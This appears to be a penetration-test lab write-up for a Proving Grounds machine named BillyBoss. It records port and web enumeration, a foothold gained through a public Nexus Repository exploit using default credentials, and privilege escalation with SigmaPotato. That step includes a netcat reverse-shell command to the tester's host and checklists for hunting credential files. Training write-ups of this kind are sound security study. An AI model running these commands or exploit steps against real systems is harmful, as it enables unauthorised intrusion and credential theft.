**Metadata**

- IP Address:  192.168.162.81
- Hostname: 
- OS: 	
- Found Credentials/Users:

Main Objectives:
nathan
administrator

Local.txt = 47ad5dadd9e9d54db3291527433f4cac
Proof.txt = 422de4f47c1da097ec5a361809eb6f8d

**Enumeration**

1. NMAP Scans (TCP/UDP)

```

[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.162.61 -oN - 
# Nmap 7.95 scan initiated Fri Jan 23 19:03:48 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.162.61
Nmap scan report for 192.168.162.61
Host is up (0.079s latency).
Not shown: 944 closed tcp ports (reset), 50 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8081/tcp open  blackice-icecap

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.162.61 -oN /home/kali/ProvingGround/BillyBoss/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/BillyBoss/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-23 19:03 MST
Nmap scan report for 192.168.162.61
Host is up (0.095s latency).
Not shown: 64740 closed tcp ports (reset), 782 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8081/tcp  open  http          Jetty 9.4.18.v20190429
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 566.00 seconds

[+] Running: Nmap MEDIUM UDP (top 1000 + bounded)
[+] Command: nmap -sU -Pn -n --top-ports 1000 -T4 --open -sV --version-intensity 5 --max-retries 1 --host-timeout 20m 192.168.162.61 -oN /home/kali/ProvingGround/BillyBoss/nmap/medium_udp.nmap -oG /home/kali/ProvingGround/BillyBoss/nmap/medium_udp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-23 19:13 MST
Warning: 192.168.162.61 giving up on port because retransmission cap hit (1).
Stats: 0:14:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 34.54% done; ETC: 19:53 (0:25:46 remaining)
Nmap scan report for 192.168.162.61
Host is up (0.079s latency).
Skipping host 192.168.162.61 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .



```

2. Interesting Ports/Services

```
[+] Open TCP ports (open only): 21, 80, 135, 139, 445, 5040, 8081, 49664, 49665, 49666, 49667, 49668, 49669
[+] Open UDP ports (open only): <none>
[+] Running: Nmap SCRIPTS TCP (open ports)

```

3. FTP Enumeration

```
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT

ftp 192.168.162.61 
Connected to 192.168.162.61.
220 Microsoft FTP Service
Name (192.168.162.61:kali): anonymous
534 Policy requires SSL.
ftp: Login failed
ftp> 

wget -r ftp://anonymous:anonymous@192.168.162.61                                                           
--2026-01-23 19:08:03--  ftp://anonymous:*password*@192.168.162.61/
           => ‘192.168.162.61/.listing’
Connecting to 192.168.162.61:21... connected.
Logging in as anonymous ... 
The server refuses login.
Retrying.

```

4. Web Enumeration (80)

```
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-title: BaGet
|_http-server-header: Microsoft-IIS/10.0

Site Visit: 
1. Site is running BaGet
2. Has upload functionality at http://192.168.162.61/upload
3. 

Possibe Exploits:
1. 

[?] Re-run with --exclude-length 2166 ? (y/N): y
[+] Running: Gobuster BASIC (80) (exclude-length 2166)
[+] Command: gobuster dir -u http://192.168.162.61:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/BillyBoss/gobuster/BillyBoss_192.168.162.61_80_dir_basic.txt --exclude-length 2166 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.61:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          2166
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico          (Status: 200) [Size: 15086]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================


gobuster dir -u http://192.168.101.110 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Common directories and files

gobuster dir -u http://192.168.101.110 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Files

```

5. Web Enumeration (8081) 

```
8081/tcp  open  http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-title: Nexus Repository Manager

Site Visit: 
1. Sonatype Nexus Repository ManagerOSS 3.21.0-05
2. Authenticated with nexus/nexus
3. http://192.168.162.61/robots.txt
   User-agent: *
	Disallow: /repository/
	Disallow: /service/
	Allow: /
4. http://192.168.162.61/repository
   404
5. http://192.168.162.61/service
   
Possible Exploits:
6. https://www.exploit-db.com/exploits/49385
7. https://www.exploit-db.com/exploits/52101

[+] Running: Gobuster BASIC (8081)
[+] Command: gobuster dir -u http://192.168.162.61:8081 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/BillyBoss/gobuster/BillyBoss_192.168.162.61_8081_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.61:8081
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico          (Status: 200) [Size: 3774]
/index.html           (Status: 302) [Size: 0] [--> http://192.168.162.61:8081]
/robots.txt           (Status: 200) [Size: 66]
Progress: 4562 / 4613 (98.89%)
===============================================================
Finished


gobuster dir -u http://192.168.101.110 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Common directories and files

gobuster dir -u http://192.168.101.110 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Files

```

6. SMB Port 139, 445 Enumeration

```
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-24T02:36:01
|_  start_date: N/A

smbclient -L //192.168.162.61 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE
                
smbmap -H 192.168.162.61                  

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Something weird happened on (192.168.162.61) Error occurs while reading from remote(104) on line 1015                    
[*] Closed 1 connections     

enum4linux 192.168.162.61       
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 24 10:35:17 2026

 =========================================( Target Information )=========================================

Target ........... 192.168.162.61
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.162.61 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 192.168.162.61 )===============================

Looking up status of 192.168.162.61
No reply from 192.168.162.61

 ==================================( Session Check on 192.168.162.61 )==================================


[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.


```

6. Port 5040 Enumeration

```
Service:Diagsvc,

Standard Collector Service

Protocol:TCP

Port:5040

Used for:

Debugging and diagnostics data collection

## **Why It's Open**

Part of the Windows **Diagnostics Hub**, used by developers and system administrators to collect logs and diagnostic info remotely.

##   
**Common Risks**

- **Information Leakage:** Can expose detailed system logs and telemetry.
    
- **Privilege Escalation:** Debug services can sometimes be misused for local privilege escalation.
    
- **Poor Access Controls:** Not always well protected in default setups.
  
Tried to nc to port. Nothing interesting.
Tried to browse to it. Nothing interesting. 
```

7. Possible Exploits

```
https://www.exploit-db.com/exploits/49385
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- Navigated to http://192.168.45.151:8081 and authenticated using nexus/nexus. 
- Downloaded Nexus exploit at https://www.exploit-db.com/exploits/49385.
- Added payload to exploit using a base64 reverse shell generated at https://www.revshells.com/.

![[Pasted image 20260127123009.png]]

![[Pasted image 20260127123056.png]]

- Setup listener using Penelope.

![[Pasted image 20260127123232.png]]
- Sent exploit.

![[Pasted image 20260127123140.png]]
- Received reverse shell as billyboss\nathan.cat

![[Pasted image 20260127123322.png]]

2. Shell Access

```

```

**Post-Exploitation**

1. Basic System Info

```
#CMD
whoami
billyboss\nathan

whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

whoami /groups
hostname
systeminfo
ver
echo %USERNAME%
echo %COMPUTERNAME%
echo %USERDOMAIN%
set
wmic os get Caption,Version,BuildNumber,OSArchitecture
wmic computersystem get Model,Manufacturer,SystemType
wmic qfe get HotFixID,InstalledOn

#Powershell
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
Get-ComputerInfo
Get-WmiObject Win32_OperatingSystem
Get-WmiObject Win32_ComputerSystem
Get-HotFix

```

2. User Enumeration

```
#CMD
net user
net user <username>
net localgroup
net localgroup administrators
query us

#Powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-ADUser -Filter *    (domain joined)
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins"
whoami /all


```

3. Network Information

```
#CMD
ipconfig /all
arp -a
route print
netstat -ano
net use
net share
net session
nltest /domain_trusts
nltest /dsgetdc:<domain>

#Powershell
Get-NetIPConfiguration
Get-NetIPAddress
Get-NetRoute
Get-NetTCPConnection
Get-SmbShare
Get-SmbSession
Resolve-DnsName <hostname>
```

4. Software, Service, and Process Information

```
#CMD
wmic product get name,version
wmic product where "Vendor like '%Microsoft%'" get Name,Version
dir "C:\Program Files"
dir "C:\Program Files (x86)"

sc query
sc qc <service_name>
wmic service list brief
wmic service get name,displayname,pathname,startmode

tasklist
tasklist /v
tasklist /svc
wmic process list brief

#Powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
Get-Package

Get-Service
Get-WmiObject Win32_Service | Select Name,StartMode,State,PathName
Get-Service | Where-Object {$_.Status -eq "Running"}

Get-Process
Get-Process -IncludeUserName
Get-WmiObject Win32_Process | Select Name,ProcessId,ExecutablePath

```

4. Loot files.
```
# CMD
dir C:\
dir C:\Users
dir C:\Users\<user>\Desktop
dir C:\Users\<user>\Documents
dir C:\Users\<user>\Downloads
dir C:\Users\<user>\AppData\Roaming
dir C:\Users\<user>\AppData\Local
dir C:\inetpub\wwwroot
dir C:\xampp
dir C:\wamp

dir /s /b *.txt *.ini *.cfg *.conf *.xml *.log *.bak *.ps1 *.kdbx *.rdp *.ppk *.pem

#Powershell
Get-ChildItem C:\Users -Recurse -Include *.txt,*.ini,*.cfg,*.xml,*.kdbx -ErrorAction SilentlyContinue
Get-ChildItem C:\ -Recurse -Include *pass*,*cred*,*secret* -ErrorAction SilentlyContinue



```

5. Automated Enumeration

```




```
5. Possible PE Paths

```



```

**Privilege Escalation**

1. PE Steps

- Found that the SE Impersonate Privilege was set by running the following command. 

```
whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

- Copied SigmaPotato.exe onto Windows 10 client. Web download with not working after multiple attempts, so set SMB from my Kali box. 

```
impacket-smbserver share ./ -smb2support  
copy \\192.168.45.151\Share\SigmaPotato.exe .

```

- Copied nc64.exe onto Windows 10 machine.

```
copy \\192.168.45.151\Share\nc64.exe .

```

- Ran reverse shell using SigmaPotato.exe.

```
.\SigmaPotato.exe ".\nc64.exe 192.168.45.151 443 -e cmd.exe"
```

- Received reverse shell.

![[Pasted image 20260127140404.png]]

2. Notes

```

```

